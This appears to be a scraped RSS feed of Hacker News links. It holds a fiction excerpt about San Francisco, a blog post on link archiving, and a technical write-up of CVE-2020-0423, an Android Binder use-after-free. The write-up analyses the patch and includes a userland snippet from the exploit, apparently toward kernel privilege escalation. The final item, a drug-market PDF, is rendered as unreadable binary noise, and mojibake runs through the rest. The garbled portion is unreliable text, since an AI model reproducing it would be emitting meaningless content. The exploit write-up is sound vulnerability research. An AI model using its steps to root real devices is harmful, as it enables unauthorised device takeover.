<p>â€œYeah. And sometimes plucking the goose for feathers.â€</p> <p>â€œThatâ€™s the dumbest fucking thing Iâ€™ve ever heard.â€ Iâ€™m looking up the Four Seasons Master Suites. Eight hundred feet of commercial and residential real estate. In the top ten floors, each apartment has a private pool. Itâ€™s some of the most valuable real estate on the planet, 4th and Market, downtown San Francisco, the heart of the safest city in the United States, a technological metropolis, a smoothly running engine generating compound growth of wealth every year, the altar of innovation. A testament to the power of courageous people coming together to build the future. Hong Kong and Singapore look sleepy by comparison. â€œI guess if people fail to seize opportunity, thatâ€™s on them, and they kinda self-select, they probably werenâ€™t the right stewards of that opportunity in the first place.â€ A little delivery drone flies by silently and drops off a package through an apartment window.</p> <p>I get through the rest of the workday just fine. Our weekly 5PM residentâ€™s poll was pretty interesting: one item on the poll asked me to vote on whether or not San Francisco should petition to host the 2032 International Kite Surfing Championships at a cost of about $311.60 per taxpayer. Iâ€™m a big fan, so I voted in favor.</p> <p>Rapidfire direct democracy is a great way to make small changes, while the larger changes deserve much more diligent debate. Thereâ€™s currently a big discussion about whether the Sunset should have its housing density increased â€“ the average â€¦</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jayriverlong.github.io/2020/12/16/sf.html">https://jayriverlong.github.io/2020/12/16/sf.html</a></em></p>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/12/16/sf.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497335</guid>
            <pubDate>Mon, 21 Dec 2020 17:50:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploiting a Single Instruction Race Condition in Binder]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25497303">thread link</a>) | @pizzalife
<br/>
December 21, 2020 | https://www.longterm.io/cve-2020-0423.html | <a href="https://web.archive.org/web/*/https://www.longterm.io/cve-2020-0423.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<div>
								<div>
<div>
<h2 id="introduction">Introduction</h2>
<p>In the <a href="https://source.android.com/security/bulletin/2020-10-01">Android Security Bulletin of October</a>, the vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0423">CVE-2020-0423</a> was made public with the following description:</p>
<blockquote>
<p>In binder_release_work of binder.c, there is a possible use-after-free due to improper locking. This could lead to local escalation of privilege in the kernel with no additional execution privileges needed. User interaction is not needed for exploitation.</p>
</blockquote>
<p><strong>CVE-2020-0423</strong> is <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">yet</a> <a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">another</a> vulnerability in Android that can lead to privilege escalation. In this post, we will describe the bug and construct an exploit that can be used to gain
root privileges on an Android device.</p>
<h2 id="root-cause-analysis-of-cve-2020-0423">Root Cause Analysis of CVE-2020-0423</h2>
<h3 id="a-brief-overview-of-binder">A Brief Overview of Binder</h3>
<p>Processes on Android are isolated and cannot access each other's memory directly. However they might require to, whether it's for exchanging data between a client and a server or simply to share information between two processes.</p>
<p>Interprocess communication on Android is performed by <strong>Binder</strong>. This kernel component provides a user-accessible character device which can be used to call routines in remote process and pass arguments to it. Binder acts as a proxy between two tasks and is also responsible, among others, for handling memory allocations during data exchange as well as managing shared object's lifespans.</p>
<p>If you're not familiar with Binder's internals, we invite you to read articles on the subject, such as <a href="https://www.synacktiv.com/en/publications/binder-transactions-in-the-bowels-of-the-linux-kernel">Synacktiv's "Binder Transactions In The Bowels of the Linux Kernel"</a>. It will come in handy to understand the rest of this post.</p>
<h3 id="patch-analysis-and-brief-explanation">Patch Analysis and Brief Explanation</h3>
<p>The <a href="https://github.com/torvalds/linux/commit/f3277cbfba763cd2826396521b9296de67cf1bbc#diff-8aa818b39daaf6497eaab2ec0b404bcabf43616362fe9551ed7dd2278682af08">patch</a> for CVE-2020-0423 was upstreamed on October 10th in the Linux kernel with the following commit message:</p>
<blockquote>
<p>binder: fix UAF when releasing todo list</p>
<p>When releasing a thread todo list when tearing down
a binder_proc, the following race was possible which
could result in a use-after-free:</p>
<ol>
<li>Thread 1: enter binder_release_work from binder_thread_release</li>
<li>Thread 2: binder_update_ref_for_handle() -&gt; binder_dec_node_ilocked()</li>
<li>Thread 2: dec nodeA --&gt; 0 (will free node)</li>
<li>Thread 1: ACQ inner_proc_lock</li>
<li>Thread 2: block on inner_proc_lock</li>
<li>Thread 1: dequeue work (BINDER_WORK_NODE, part of nodeA)</li>
<li>Thread 1: REL inner_proc_lock</li>
<li>Thread 2: ACQ inner_proc_lock</li>
<li>Thread 2: todo list cleanup, but work was already dequeued</li>
<li>Thread 2: free node</li>
<li>Thread 2: REL inner_proc_lock</li>
<li>Thread 1: deref w-&gt;type (UAF)</li>
</ol>
<p>The problem was that for a BINDER_WORK_NODE, the binder_work element
must not be accessed after releasing the inner_proc_lock while
processing the todo list elements since another thread might be
handling a deref on the node containing the binder_work element
leading to the node being freed.</p>
</blockquote>
<p>It gives a rough overview of the different steps required to trigger a Use-After-Free, or UAF, using this bug. These steps will be detailed in the next section, for now let's look at the patch to understand where the vulnerability comes from.</p>
<p>In essence, what this patch does is to inline the content of the function <code>binder_dequeue_work_head</code> in <code>binder_release_work</code>. The only difference being that the <code>type</code> field of the <code>binder_work</code> struct is read while the lock on <code>proc</code> is still held.</p>
<div><pre><span></span><code><span>// Before the patch</span>

<span>static</span> <span>struct</span> <span>binder_work</span> <span>*</span><span>binder_dequeue_work_head</span><span>(</span>
                    <span>struct</span> <span>binder_proc</span> <span>*</span><span>proc</span><span>,</span>
                    <span>struct</span> <span>list_head</span> <span>*</span><span>list</span><span>)</span>
<span>{</span>
    <span>struct</span> <span>binder_work</span> <span>*</span><span>w</span><span>;</span>

    <span>binder_inner_proc_lock</span><span>(</span><span>proc</span><span>);</span>
    <span>w</span> <span>=</span> <span>binder_dequeue_work_head_ilocked</span><span>(</span><span>list</span><span>);</span>
    <span>binder_inner_proc_unlock</span><span>(</span><span>proc</span><span>);</span>
    <span>return</span> <span>w</span><span>;</span>
<span>}</span>

<span>static</span> <span>void</span> <span>binder_release_work</span><span>(</span><span>struct</span> <span>binder_proc</span> <span>*</span><span>proc</span><span>,</span>
                <span>struct</span> <span>list_head</span> <span>*</span><span>list</span><span>)</span>
<span>{</span>
    <span>struct</span> <span>binder_work</span> <span>*</span><span>w</span><span>;</span>

    <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
        <span>w</span> <span>=</span> <span>binder_dequeue_work_head</span><span>(</span><span>proc</span><span>,</span> <span>list</span><span>);</span>
        <span>/*</span>
<span>         * From this point on, there is no lock on `proc` anymore</span>
<span>         * which means `w` could have been freed in another thread and</span>
<span>         * therefore be pointing to dangling memory.</span>
<span>         */</span>
        <span>if</span> <span>(</span><span>!</span><span>w</span><span>)</span>
            <span>return</span><span>;</span>

        <span>switch</span> <span>(</span><span>w</span><span>-&gt;</span><span>type</span><span>)</span> <span>{</span> <span>/* &lt;--- Use-after-free occurs here */</span>

<span>// [...]</span>
</code></pre></div>

<div><pre><span></span><code><span>// After the patch</span>

<span>static</span> <span>void</span> <span>binder_release_work</span><span>(</span><span>struct</span> <span>binder_proc</span> <span>*</span><span>proc</span><span>,</span>
                <span>struct</span> <span>list_head</span> <span>*</span><span>list</span><span>)</span>
<span>{</span>
    <span>struct</span> <span>binder_work</span> <span>*</span><span>w</span><span>;</span>
    <span>enum</span> <span>binder_work_type</span> <span>wtype</span><span>;</span>

    <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
        <span>binder_inner_proc_lock</span><span>(</span><span>proc</span><span>);</span>
        <span>/*</span>
<span>         * Since the lock on `proc` is held while calling</span>
<span>         * `binder_dequeue_work_head_ilocked` and reading the `type` field of</span>
<span>         * the resulting `binder_work` stuct, we can be sure its value has not</span>
<span>         * been tampered with.</span>
<span>         */</span>
        <span>w</span> <span>=</span> <span>binder_dequeue_work_head_ilocked</span><span>(</span><span>list</span><span>);</span>
        <span>wtype</span> <span>=</span> <span>w</span> <span>?</span> <span>w</span><span>-&gt;</span><span>type</span> <span>:</span> <span>0</span><span>;</span>
        <span>binder_inner_proc_unlock</span><span>(</span><span>proc</span><span>);</span>
        <span>if</span> <span>(</span><span>!</span><span>w</span><span>)</span>
            <span>return</span><span>;</span>

        <span>switch</span> <span>(</span><span>wtype</span><span>)</span> <span>{</span> <span>/* &lt;--- Use-after-free not possible anymore */</span>

<span>// [...]</span>
</code></pre></div>

<p>Before this patch, it was possible to dequeue a <code>binder_work</code> struct, have another thread free and reallocate it to then change the control flow of <code>binder_release_work</code>. The next section will try to give a more thorough explanation as to why this behavior occurs and how it can be triggered arbitrarily.</p>
<h3 id="in-depth-analysis">In-Depth Analysis</h3>
<p>In this section, as an example, let's imagine that there are two processes communicating using binder: a sender and a receiver.</p>
<p>At this point, there are three prerequisites to trigger the bug:</p>
<ol>
<li>a call to <code>binder_release_work</code> from the sender's thread</li>
<li>a <code>binder_work</code> structure to dequeue from the sender thread's <code>todo</code> list</li>
<li>a free on the <code>binder_work</code> structure from the receiver thread</li>
</ol>
<p>Let's go over them one by one and try to figure out a way to fulfill them.</p>
<h4 id="calling-binder_release_work">Calling <code>binder_release_work</code></h4>
<p>This prerequisite is pretty straightforward. As explained earlier, <code>binder_release_work</code> is part of the clean up routine when a task is done using binder. It can be called explicitly in a thread using the ioctl command <code>BINDER_THREAD_EXIT</code>.</p>
<div><pre><span></span><code><span>// Userland code from the exploit</span>

<span>int</span> <span>binder_fd</span> <span>=</span> <span>open</span><span>(</span><span>"/dev/binder"</span><span>,</span> <span>O_RDWR</span><span>);</span>
<span>// [...]</span>
<span>ioctl</span><span>(</span><span>binder_fd</span><span>,</span> <span>BINDER_THREAD_EXIT</span><span>,</span> <span>0</span><span>);</span>
</code></pre></div>

<p>This ioctl will end up calling the kernel function <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4977"><code>binder_ioctl</code></a> located at <code>drivers/android/binder.c</code>.</p>
<p><code>binder_ioctl</code> will then reach the <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#5038"><code>BINDER_THREAD_EXIT</code></a> case and call <code>binder_thread_release</code>. <code>thread</code> is a <code>binder_thread</code> structure containing information about the current thread which made the <code>ioctl</code> call.</p>
<div><pre><span></span><code><span>static</span> <span>long</span> <span>binder_ioctl</span><span>(</span><span>struct</span> <span>file</span> <span>*</span><span>filp</span><span>,</span> <span>unsigned</span> <span>int</span> <span>cmd</span><span>,</span> <span>unsigned</span> <span>long</span> <span>arg</span><span>)</span>
<span>{</span>
    <span>// [...]</span>

    <span>case</span> <span>BINDER_THREAD_EXIT</span><span>:</span>
        <span>binder_debug</span><span>(</span><span>BINDER_DEBUG_THREADS</span><span>,</span> <span>"%d:%d exit</span><span>\n</span><span>"</span><span>,</span>
                    <span>proc</span><span>-&gt;</span><span>pid</span><span>,</span> <span>thread</span><span>-&gt;</span><span>pid</span><span>);</span>
        <span>binder_thread_release</span><span>(</span><span>proc</span><span>,</span> <span>thread</span><span>);</span>
        <span>thread</span> <span>=</span> <span>NULL</span><span>;</span>
        <span>break</span><span>;</span>

    <span>// [...]</span>
</code></pre></div>

<p>Near the end of <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4691"><code>binder_thread_release</code></a> appears the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4772"><code>binder_release_work</code></a>.</p>
<div><pre><span></span><code><span>static</span> <span>int</span> <span>binder_thread_release</span><span>(</span><span>struct</span> <span>binder_proc</span> <span>*</span><span>proc</span><span>,</span>
                 <span>struct</span> <span>binder_thread</span> <span>*</span><span>thread</span><span>)</span>
<span>{</span>
    <span>// [...]</span>

    <span>binder_release_work</span><span>(</span><span>proc</span><span>,</span> <span>&amp;</span><span>thread</span><span>-&gt;</span><span>todo</span><span>);</span>
    <span>binder_thread_dec_tmpref</span><span>(</span><span>thread</span><span>);</span>
    <span>return</span> <span>active_transactions</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Notice that the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4551"><code>binder_release_work</code></a> has the value <code>&amp;thread-&gt;todo</code> for the parameter <code>struct list_head *list</code>. This will become relevant in the following section when we try to populate this list with <code>binder_work</code> structures.</p>
<div><pre><span></span><code><span>static</span> <span>void</span> <span>binder_release_work</span><span>(</span><span>struct</span> <span>binder_proc</span> <span>*</span><span>proc</span><span>,</span>
                <span>struct</span> <span>list_head</span> <span>*</span><span>list</span><span>)</span>
<span>{</span>
    <span>struct</span> <span>binder_work</span> <span>*</span><span>w</span><span>;</span>

    <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
        <span>w</span> <span>=</span> <span>binder_dequeue_work_head</span><span>(</span><span>proc</span><span>,</span> <span>list</span><span>);</span> <span>/* dequeues from thread-&gt;todo */</span>
        <span>if</span> <span>(</span><span>!</span><span>w</span><span>)</span>
            <span>return</span><span>;</span>

    <span>// [...]</span>
</code></pre></div>

<p>Now that we know how to trigger the vulnerable function, let's determine how we can fill the <code>thread-&gt;todo</code> list with arbitrary <code>binder_work</code> structures.</p>
<h4 id="dequeueing-a-binder_work-structure-of-the-sender-thread">Dequeueing a <code>binder_work</code> Structure of the Sender Thread</h4>
<p><code>binder_work</code> structures are enqueued into <code>thread-&gt;todo</code> at two locations:</p>
<ol>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#824"><code>binder_enqueue_deferred_thread_work_ilocked</code></a></li>
</ol>
<div><pre><span></span><code><span>static</span> <span>void</span>
<span>binder_enqueue_deferred_thread_work_ilocked</span><span>(</span><span>struct</span> <span>binder_thread</span> <span>*</span><span>thread</span><span>,</span>
                        <span>struct</span> <span>binder_work</span> <span>*</span><span>work</span><span>)</span>
<span>{</span>
    <span>binder_enqueue_work_ilocked</span><span>(</span><span>work</span><span>,</span> <span>&amp;</span><span>thread</span><span>-&gt;</span><span>todo</span><span>);</span>
<span>}</span>
</code></pre></div>

<ol>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#842"><code>binder_enqueue_thread_work_ilocked</code></a></li>
</ol>
<div><pre><span></span><code><span>static</span> <span>void</span>
<span>binder_enqueue_thread_work_ilocked</span><span>(</span><span>struct</span> <span>binder_thread</span> <span>*</span><span>thread</span><span>,</span>
                   <span>struct</span> <span>binder_work</span> <span>*</span><span>work</span><span>)</span>
<span>{</span>
    <span>binder_enqueue_work_ilocked</span><span>(</span><span>work</span><span>,</span> <span>&amp;</span><span>thread</span><span>-&gt;</span><span>todo</span><span>);</span>
    <span>thread</span><span>-&gt;</span><span>process_todo</span> <span>=</span> <span>true</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>These functions are used in different places in the code, but an interesting code path is the one starting in <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2524"><code>binder_translate_binder</code></a>. This function is called when a thread sends a transaction containing a <code>BINDER_TYPE_BINDER</code> or a <code>BINDER_TYPE_WEAK_BINDER</code>.</p>
<p>A binder node is created from this binder object and the reference counter for the process on the receiving end is increased. As long as the receiving process holds a reference to this node, it will stay alive in Binder's memory. However, if the process releases the reference, the node is destroyed, which is what we will try to achieve later on to trigger the UAF.</p>
<p>First, let's explain how the binder node and the <code>thread-&gt;todo</code> list are related
in the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2553"><code>binder_inc_ref_for_node</code></a>.</p>
<div><pre><span></span><code><span>static</span> <span>int</span> <span>binder_translate_binder</span><span>(</span><span>struct</span> <span>flat_binder_object</span> <span>*</span><span>fp</span><span>,</span>
                   <span>struct</span> <span>binder_transaction</span> <span>*</span><span>t</span><span>,</span>
                   <span>struct</span> <span>binder_thread</span> <span>*</span><span>thread</span><span>)</span>
<span>{</span>
    <span>// [...]</span>
    <span>ret</span> <span>=</span> <span>binder_inc_ref_for_node</span><span>(</span><span>target_proc</span><span>,</span> <span>node</span><span>,</span>
            <span>fp</span><span>-&gt;</span><span>hdr</span><span>.</span><span>type</span> <span>==</span> <span>BINDER_TYPE_BINDER</span><span>,</span>
            <span>&amp;</span><span>thread</span><span>-&gt;</span><span>todo</span><span>,</span> <span>&amp;</span><span>rdata</span><span>);</span>
    <span>// [...]</span>
<span>}</span>
</code></pre></div>

<p><code>binder_inc_ref_for_node</code> parameters are as follows:</p>
<ul>
<li><code>struct binder_proc *proc</code>: process that will hold a reference to the node</li>
<li><code>struct binder_node *node</code>: target node</li>
<li><code>bool strong</code>: true=strong reference, false=weak reference</li>
<li><code>struct list_head *target_list</code>: worklist to use if node is incremented</li>
<li><code>struct binder_ref_data *rdata</code>: the id/refcount data for the ref</li>
</ul>
<p><code>target_list</code> in our current path is <code>thread-&gt;todo</code>. This parameter is only used in <code>binder_inc_ref_for_node</code> in the call to <code>binder_inc_ref_olocked</code>.</p>
<div><pre><span></span><code><span>static</span> <span>int</span> <span>binder_inc_ref_for_node</span><span>(</span><span>struct</span> <span>binder_proc</span> <span>*</span><span>proc</span><span>,</span>
            <span>struct</span> <span>binder_node</span> <span>*</span><span>node</span><span>,</span>
            <span>bool</span> <span>strong</span><span>,</span>
            <span>struct</span> <span>list_head</span> <span>*</span><span>target_list</span><span>,</span>
            <span>struct</span> <span>binder_ref_data</span> <span>*</span><span>rdata</span><span>)</span>
<span>{</span>
    <span>// [...]</span>
    <span>ret</span> <span>=</span> <span>binder_inc_ref_olocked</span><span>(</span><span>ref</span><span>,</span> <span>strong</span><span>,</span> <span>target_list</span><span>);</span>
    <span>//â€¦</span></code></pre></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.longterm.io/cve-2020-0423.html">https://www.longterm.io/cve-2020-0423.html</a></em></p>]]>
            </description>
            <link>https://www.longterm.io/cve-2020-0423.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497303</guid>
            <pubDate>Mon, 21 Dec 2020 17:48:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Your Digital Attic]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25497117">thread link</a>) | @etherio
<br/>
December 21, 2020 | https://www.uzpg.me/tech/2020/12/21/building-your-digital-attic.html | <a href="https://web.archive.org/web/*/https://www.uzpg.me/tech/2020/12/21/building-your-digital-attic.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
        <div>

  

  <p><span>knowledge</span></p><p>21 Dec 2020</p>


<p>3 minute read</p>

<p>A <strong>digital attic</strong> is a collection of the links and content youâ€™ve found on the web. I store mine in a <a href="https://uzpg.me/attic.html">markdown file</a> (<a href="https://github.com/Uzay-G/portfolio/blob/master/attic.md">source</a>). Itâ€™s meant to be easy to move around and share, and I usually update mine every once in a while by pooling from my bookmarks.</p>

<p>This â€œatticâ€ has two purposes:</p>

<ul>
  <li>Have a readable, clear organization of all the cool stuff you find online. This allows you to look back on old content easily. The problem with the way most browsers handle bookmarks is that you always have to go through a certain amount of effort to have some sort of flexible, readable and clean organization of your links.</li>
  <li>Be able to share the things youâ€™ve found interesting and also exchange with other peopleâ€™s attics.</li>
</ul>

<p>Iâ€™ve found some similar implementations of <a href="https://zalberico.com/about/">digital attics</a> online, and always found them insightful and useful.</p>

<p>However, this process of indexing and then revisiting these links showed me another problem with the way content persists on the web.</p>
      <h2 id="link-rot">
        
        
          Link rot <a href="#link-rot">#</a>
        
        
      </h2>
    

<p>I updated <a href="https://uzpg.me/attic.html">my attic</a> yesterday, and noticed that quite a few links no longer returned anything.</p>

<p>This is <strong>link rot</strong>, the gradual abandonment of websites / content that leads to a loss of information and <strong>public record</strong>.</p>

<p><img src="https://www.visualcapitalist.com/wp-content/uploads/2017/08/linkrot-1.jpg" alt="link rot visualization"></p>

<p>This loss is linked to the financial / time commitment needed to run a website. <a href="https://jeffhuang.com/designed_to_last/">Jeff Huangâ€™s manifesto â€œDesigned to Lastâ€</a> also describes this problem and potential ways to simplify serving content and make your websites more resilient.</p>

<p>Another approach, proposed by the Internet Archive and its amazing <a href="http://web.archive.org/">Wayback Machine</a> initiative is to actually store copies of websites as they were in the past.</p>

<p>A similar way Iâ€™m trying to work on this problem is <a href="https://archivy.github.io/">Archivy</a>, a knowledge base tool that stores local copies of web-pages in Markdown. One of its core focuses is <a href="https://archivy.github.io/difference/">extensibility</a> and building in ways for users to interact with their knowledge programmatically.</p>
      <h2 id="making-things-easy">
        
        
          Making things easy <a href="#making-things-easy">#</a>
        
        
      </h2>
    

<p>Organizational tasks like these can sometimes get tedious (especially if you have to check if the links still work), and it can be annoying to waste too much time on updating your attic. This is why in my case I wrote a <a href="https://github.com/Uzay-G/garret">simple Crystal script</a> that converts the Firefox JSON bookmark export to clean Markdown.</p>

<p>Since there are obviously some links I donâ€™t think are useful to put into my attic, I also added some functionality where you can store a file with links to be ignored.</p>

<p>This process helps me quickly update my attic whenever I feel like it, but more than that, it would make it easy for me to download web-pages automatically, preventing them from degrading with link rot.</p>

<p>Iâ€™m thinking about adding a few features to this tool that would work against this problem:</p>

<ul>
  <li>The code could connect to the <a href="https://archivy.github.io/reference/web_api/">Archivy Web API</a> and pass it the page URLs for it to save and mirror them.</li>
  <li>Automatic checking of which links are no longer up.</li>
</ul>

<p>I recommend finding a way to automate the action of updating your attic if you build one, because itâ€™ll help make the process more fun.</p>

<p>This concept is merely an idea for a manner in which you can index this information, but Iâ€™m sure there are many other innovative and creative way to go about this (and Iâ€™d love to hear about them!).</p>

<p>If you find any other intriguing attics, please link them! Iâ€™m always curious :)</p>


<p>Check out the <a href="https://tinyletter.com/uzpg_/">blog newsletter</a> to know when there are new posts / updates!</p>

<br>
<hr id="bottom">
<br>
<applause-button color="#5d5b6a">


</applause-button></div>

    </div></div>]]>
            </description>
            <link>https://www.uzpg.me/tech/2020/12/21/building-your-digital-attic.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497117</guid>
            <pubDate>Mon, 21 Dec 2020 17:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New Psychoactive Substances: Global Markets, Local Threats, & COVID-19 Pandemic [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25497079">thread link</a>) | @infodocket
<br/>
December 21, 2020 | https://www.emcdda.europa.eu/system/files/publications/13464/20205648_TD0320796ENN_PDF_rev.pdf | <a href="https://web.archive.org/web/*/https://www.emcdda.europa.eu/system/files/publications/13464/20205648_TD0320796ENN_PDF_rev.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div ÃˆÃ­â„¢5=";bÅ Â¤6Xï¿½M&amp;Â»MÃ´M#DÅ½]&quot;Ã¤Ëœ&amp;Å¸SÃ´RFo:6Â¥U@!ÃÂ±Ã‹Å½Ã†Â¸â‚¬Â§UÂ¡ÃŒÃ­Ã©Ã‘^.Ã°@q&quot;(VPï¿½Jâ€¢cÅ¸$Å’'Ã§vÃ£Ã›Â¿Â£Ã´ÃÃ¢Ã¨â€ bQÂ³5*Ãƒ0GeKkHÃŠâ€™&nbsp;Å¾)LJE" Ã‹="">Ã“Ã©â€ºï¿½CDdTÃrÃ‚Ã†â€¢Ã—eÂ¥jv"	Ã¬Ã´Ã¨M25-dbÃ²ÃµxÃ†Ã†Âµ4Â®]HÃ•Ã©]Ã®Kâ‚¬râ€°u5Â­JÃ–Â¬
2aÃ–+Â¶â€ -/Â¤Â§Ã±â€šÃ›2@â€œÂ¸â€˜Â°tÃ¶]( a@Ã¸ZQË†Ã°Ã–â€¡ÃÂ·wÃ›Ã–*â€šÆ’,â„¢)"OÃ”]cEEÃ²Ã¸â€”=(xAâ€¦&amp;doÂ¨&lt;â€™vâ€˜Â¸Ãšls$â‚¬5-Â°tlÂ­3Â£Ã£Â¿Ã‚V@ï¿½LOJÃ¢Â©Â¢HÃmÃ¶â€œDÃ©Ë†HÅ½Ã­2Â²1ÃFlÃ”Ã¯\Ã«ï¿½&nbsp;ÃŒÃˆXÃƒâ€šâ€˜4oÅ¡dÂ²'JwÃ½#cÂµwcÂ¾Ã–Ã‘Â´â€°sâ€¦%sÃÃ£.Â­â€Â¸UÂ¸Â¸â€ï¿½HÃˆÂ¡ÃŒZâ€œEhÅ tÂ¼^Ã &lt;Ã¯:Ãƒi7Â¶Ã—Â²H"â€¢Ã¢kÅ“Å 2Ãƒ(Â§#}Â±u1C-â€™lâ€“Â£râ€DJ"Ã‰Ã±	UÂ¡Ë†Å’Â«\
Ã Ã!ÃªÃ¨IÂ®yÂ©Ã‹Â¯Â³â€™&nbsp;Å¾Ã’Ã•RÂºÂ«Ã„â‚¬â€¹)Â¡FÃ¶]â€sÃ•Ã”Ã´m:7Â«MÃ˜&nbsp;&gt;Ã§Ãš9CÅ Â´Â­â€“Ã¯ï¿½ÃÃ°â€¡7XÅ’Ã¿Ã•Å¸Â¥Æ’ÃŸ.â€ºÂº&lt;Â°ÂºÂ©Ã®Ã¢
,â€˜Ã„@4-Ãƒâ€Ã†Ã¤
 Ã‹â€â€™CÂ¶Å“Å¾Ãƒ#Ã—zZâ€œJhÃxâ€^Ã cÂ«Z$a,F7JG RÂ¦Â¶(Å¡ï¿½ÃˆbÂ®;Ã‰Å’Ë†â€¢|,XÃ…aÂ»Â±gÃï¿½YOaÃ—Ã‚Â¿Gxâ„¢Lâ€”Iâ„¢Ã‹aP0Ã…!Â°Å’ï¿½0Âªâ€°câ„¢Ã™eÃQnhQÃ±â€¦Ã‰8%Ã‚i%Â°Â³Â«Â¶Ã»0Â·Ãµâ€˜XIâ€œâ€“
$Câ€"eL*Â´Â®Yâ€œÂ¶ÃˆÃ’FÂ¦1HÅ“ï¿½Æ’6â€°Ã’7Ã¦f7â‚¬Ã°â€˜TÂ¯PË†Â½ZÂª7(ÃšwZÃ§ChÃˆtrqeâ€¦)ZÃ¤Ãƒ&lt;2qÃ«5Ã¦Ã·)+Ã Ã’I*Ã!ÃƒÃ‚Ã€. Ã¡Â¯â€Â¥Â¤Â£Ã©BAÅ½Ã®Ë†ExÃ’HXï¿½Ã›KQE[=Â»Â­hÂ­Ã˜â€â€™I'fÂ»ÃˆÂ·Wjï¿½KÃcLï¿½9Ã‘8@YM3ï¿½nÂ³WÂ­tÂ¾â€˜4ÃŠÃ«â‚¬Â³Ã±AÂ°Ã²Qw6Ã³hï¿½ï¿½&amp;2oÃ Ã 1Ã¢Ã€ÃŒpÃï¿½Å½Ã›Hâ€¦/Ã‘Â¹oG0Â¨ï¿½(Tl2Âµ@Â¦VÃƒLï¿½taÆ’Â«wÃ«;â€ bÅ¡ÃˆEkÃ‹PÂ°)Ã“ÂµÃÃš5â€Â£J&amp;IÂ³	Â¥EÂ¢ËœdÃ‹â€¢hÅ“Ã®Â¡Ã³1Rï¿½Ã°Ã¥Ã!z6ÃšÃ!ÃªÃ#eLÃ¤sâ€”bÃ–Ã†Ã²'D1Ã›Â±%â€¢ËœÃ”F]ZË†Ã¡ÂªÂ¡ÃŠÃ¡Â¢1Å¡VÂ¥Ã†Ã›1xÃ o2Â°ï¿½Â¹ÃÂ¤Â§â€¦xÃŒ:Â«.Ã„
â€“.Â·P3@IÃ‹&lt;Ã»{mbÂ»Â¡Â¢FÂ«Ã“
-ï¿½Ã£#,0DÃ¥Ã”"Ã“Â«ï¿½Â²;hRÅ¾Å½ÃŠ[Â¡â€”,P)Ãƒ\Â²NI[Â£iÅ B(XÂ¬â€ºÃ­
Ã¦Ã°â€ bJgQÂ·XlÃ¸Ã€â€¢:ÃÃ»%Å¡:Ã3RÂ¥ï¿½Esâ€Å¡Uâ€¡â€wÆ’â€”NÃ–EÃ™Â²Â¶hfmï¿½Ã¦CÅ Ã¶Â½Ãƒâ€šCA@'Ã‚ÂµÃœ(Ã¢Ãµ&nbsp;{;â€™DËœ*â€šI11AÂ³"Ã2ÃˆÃ…Â¤Â©Ã›Ã›R-*ÂµÂ®Ã™l}bâ€Ã“Ã—a-
nBÅ’ÃªÂ¤ï¿½Â¸Ã­aÃµÅ¸C( pÆ’-ï¿½â€˜â€ÃÃ«Ã–{Â»mÂ§Â´1Â¶Ã‘fÃ¼Ã„OAÃ¬-ï¿½Â¡Å’PÅ’ÂºÃÂ¢HjÃ!Ã…â€â€™Ã‘?gÂ¨Â»jâ€˜ï¿½â€¢ÃœGtâ€¢Ã¸8bâ€“Ã²[Â«ÂµS&amp;|BÂ¸â€ Ã¢,Ã´Â°$ÃVXï¿½Â¢dÂ¢Æ’.Ãˆ4.FÃ•D~VÆ’M(.Â®Ã²Ã'â€Ã‹x$Â¹?Ã“Â±Ã¨â€ºY#)[FÂ¢Æ’P(,&nbsp;Ã¤â€ %3Ã•lÃˆ`mÂ¶XÃ›fYÂ¨sÂ¶ÃÃ¿Ã–â€”%7Ã™â€”RÃ‚â€“uË†b7Lâ€¦4z\Ã¸IdVâ€”:Å¡Ã“Â£â€¢Â«	ÃÂ¤{Å“NÃ„:Ã«Ã…lï¿½ï¿½EL
